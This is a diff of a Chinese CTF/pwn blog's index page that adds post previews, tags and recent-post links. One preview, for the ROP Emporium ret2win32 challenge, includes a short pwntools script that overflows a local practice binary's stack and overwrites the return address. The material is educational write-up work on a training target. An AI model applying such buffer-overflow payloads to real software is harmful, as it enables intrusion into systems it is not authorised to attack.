@@ -133,6 +133,62 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2024/04/28/2024xyctf-pwn-wp/" title="让新生重获新生的新生赛">『XYCTF2024』 PWN WP</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-04-28  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>这新生赛难度新生打不了一点，这是让我这种菜鸡获得新生的比赛（但是AK了</p>
+<h3 id="0x01-hello-world（签到）"><a href="#0x01-hello-world（签到）" class="headerlink" title="0x01 hello_world（签到）"></a>0x01 hello_world（签到）</h3>
+	
+	</div>
+  <a type="button" href="/2024/04/28/2024xyctf-pwn-wp/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2024/04/07/rop-emporium-ret2win/" title="https://ropemporium.com 各种架构的ROP练习">『ROP Emporium』ret2win</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2024-04-07  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="0x01-ret2win32"><a href="#0x01-ret2win32" class="headerlink" title="0x01 ret2win32"></a>0x01 ret2win32</h3><p>x86架构的ret2text，非常简单，程序有栈溢出，没有canary保护，所以只要溢出覆盖ebp后，将ret地址覆盖为ret2win函数的地址即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win = <span class="number">0x804862C</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p32(ret2win)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+	
+	</div>
+  <a type="button" href="/2024/04/07/rop-emporium-ret2win/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2024/03/28/2016HCTF-fheap/" title="2016HCTF_fheap的其中一种解法和自己的理解">『BUU』2016HCTF_fheap</a>
 		</h3>
 		</div>
@@ -355,9 +411,13 @@
 		
 			<li><a href="/categories/hijack-libc-got/">hijack_libc_got<span>1</span></a></li>
 		
+			<li><a href="/categories/protobuf/">protobuf<span>1</span></a></li>
+		
 			<li><a href="/categories/ret2-libc-start-main/">ret2__libc_start_main<span>1</span></a></li>
 		
 			<li><a href="/categories/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
+		
+			<li><a href="/categories/图灵完备/">图灵完备<span>1</span></a></li>
 		
 		</ul>
 	</div>
@@ -368,31 +428,35 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/docker/">docker<span>1</span></a></li>
-		
-			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
-		
-			<li><a href="/tags/WP/">WP<span>11</span></a></li>
-		
-			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
-		
-			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
-		
-			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
-		
-			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
-		
 			<li><a href="/tags/exit-hook/">exit_hook<span>2</span></a></li>
-		
-			<li><a href="/tags/CTF/">CTF<span>18</span></a></li>
-		
-			<li><a href="/tags/libc-got/">libc_got<span>1</span></a></li>
-		
-			<li><a href="/tags/PWN/">PWN<span>21</span></a></li>
 		
 			<li><a href="/tags/heap/">heap<span>6</span></a></li>
 		
+			<li><a href="/tags/PWN/">PWN<span>21</span></a></li>
+		
+			<li><a href="/tags/ROP/">ROP<span>2</span></a></li>
+		
+			<li><a href="/tags/cpp异常处理机制/">cpp异常处理机制<span>1</span></a></li>
+		
+			<li><a href="/tags/CTF/">CTF<span>19</span></a></li>
+		
+			<li><a href="/tags/libc-got/">libc_got<span>1</span></a></li>
+		
+			<li><a href="/tags/图灵完备，计组/">图灵完备，计组<span>1</span></a></li>
+		
+			<li><a href="/tags/PWN，protobuf/">PWN，protobuf<span>1</span></a></li>
+		
+			<li><a href="/tags/docker/">docker<span>1</span></a></li>
+		
 			<li><a href="/tags/diary/">diary<span>14</span></a></li>
+		
+			<li><a href="/tags/ret2dlresolve/">ret2dlresolve<span>1</span></a></li>
+		
+			<li><a href="/tags/BUU/">BUU<span>1</span></a></li>
+		
+			<li><a href="/tags/WP/">WP<span>11</span></a></li>
+		
+			<li><a href="/tags/IO-FILE/">IO_FILE<span>2</span></a></li>
 		
 		 
 		</ul>
@@ -406,6 +470,14 @@
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2024/10/11/protobuf-install/"  title="自从国赛遇到protobuf题目之后就一直想好好研究一下，最近才学习其用法。" ><i class="fa fa-file-o"></i>protobuf pwn题环境配置及基础操作</a>
+      </li>
+    
+      <li>
+        <a href="/2024/09/25/Turing-Complete-1/"  title="开启计组学习的新大门" ><i class="fa fa-file-o"></i>『图灵完备』完全攻略之基础逻辑电路（一）</a>
+      </li>
+    
+      <li>
         <a href="/2024/09/02/2024ycb-wp/"  title="卷" ><i class="fa fa-file-o"></i>『2024羊城杯初赛』 PWN WP</a>
       </li>
     
@@ -415,14 +487,6 @@
     
       <li>
         <a href="/2024/08/28/cpp-exception/"  title="从2024羊城杯logger题目引起的cpp异常处理机制学习" ><i class="fa fa-file-o"></i>C++异常处理机制及其利用研究</a>
-      </li>
-    
-      <li>
-        <a href="/2024/08/25/diary/24-8-25/" ><i class="fa fa-file-o"></i>日志 24-8-25</a>
-      </li>
-    
-      <li>
-        <a href="/2024/08/24/diary/24-8-24/" ><i class="fa fa-file-o"></i>日志 24-8-24</a>
       </li>
     
   </ul>
